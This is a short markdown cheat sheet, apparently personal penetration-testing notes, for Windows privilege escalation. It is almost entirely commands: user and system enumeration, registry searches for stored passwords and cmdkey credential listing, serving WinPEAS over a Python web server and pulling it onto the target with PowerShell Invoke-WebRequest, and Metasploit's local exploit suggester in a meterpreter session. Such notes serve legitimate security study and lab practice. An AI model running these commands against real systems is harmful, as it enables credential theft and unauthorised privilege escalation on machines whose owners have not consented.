### Information Gathering
User Enumeration
- `whoami /priv` Current user privileges
- `net users` List users
- `net user $username` Detail of a specific user
- `qwinsta` Other users logged in

<!-- -->
Misc
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` get OS version
 - `wmic qfe get Caption,Description,HotFixID,InstalledOn` list updates on system
 - `wmic product get name,version,vendor` installed apps
 - `schtasks /query /fo LIST /v` query scheduled tasks
- `driverquery` list drivers installed
- `sc query windefend` is windows Defender on?
- `cmdkey /list` list
- `reg query HKLM /f password /t REG_SZ /s` registry key containing passwords
- `reg query HKCU /f password /t REG_SZ /s` registry key containing passwords
<!-- -->

		Kernal Exploits
- `driverquery`
### Winpeas.exe
Local:
- `python3 -m http.server 80`

<!-- -->
Remote: 
- `powershell.exe -command IWR -Uri $IP/winpeas.exe -OutFile winpeas.exe"`
- `winpeas.exe`
 <!-- -->
 
 [Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 ### Metasploit
 only works if you have meterpreter shell
 
 - `background` background current shell
 - `use post/multi/recon/local_exploit_suggester`
 - `set session 1`
 - `run`
 
 <!-- -->
 You might need to migrate meterprete shell